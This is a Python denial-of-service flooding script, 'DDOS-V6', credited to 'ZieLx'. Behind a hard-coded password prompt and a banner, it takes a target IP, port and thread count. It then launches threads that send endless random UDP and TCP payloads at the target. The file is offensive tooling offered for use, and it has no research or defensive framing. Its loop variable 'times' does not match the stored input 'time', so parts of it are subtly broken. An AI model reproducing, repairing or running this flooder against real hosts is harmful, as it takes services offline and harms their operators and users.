#Made In ZieLx
#Dibuat Dengan penuh cinta

import random
import socket
import os
import threading
import sys
import time

os.system("clear")
password =input("[•] Password : ")
time.sleep(5)
                                
if password=="DDOS-V6":
	print("[•] Correct...")
	time.sleep(5)
else:
		print("\033[91m[×] Wrong Password!!!")
		time.sleep(9999999999)
os.system("clear")

print("""\033[35m	
  ____  ____   ___  ____     __     ____   
 |  _ \|  _ \ / _ \/ ___|    \ \   / / /_  
 | | | | | | | | | \___ \ ____\ \ / / '_ \ 
 | |_| | |_| | |_| |___) |_____\ V /| (_) |
 |____/|____/ \___/|____/       \_/  \___/ 
                                           """)
print("\033[36m               MADE IN ZIELX")
print("\033[36m              ΣYe$ COMMUNITY\n")

choice =str(input("\033[32m >>> \033[31m Done Subs? (y/n) : "))
ip =str(input("\033[32m >>> \033[31m IP TARGET : "))
port =int(input("\033[32m >>> \033[31m PORT TARGET : "))
time =int(input("\033[32m >>> \033[31m PACKETS : "))
threads =int(input("\033[32m >>> \033[31m THREADS : "))

def ddos():
	data = random._urandom(577)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
		except:
			print("\033[91m[•]\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))


def ddos2():
	data = random._urandom(462)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
		except:
			s.close()
			print("\033[91m[•]\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))

def ddos3():
	data = random._urandom(1025)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
		except:
			s.close()
			print("\033[91m[•]\u001b[32m Send Attack To \033[36m >>> \033[31m{}:{} \u001b[36m".format(ip, port))
				
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()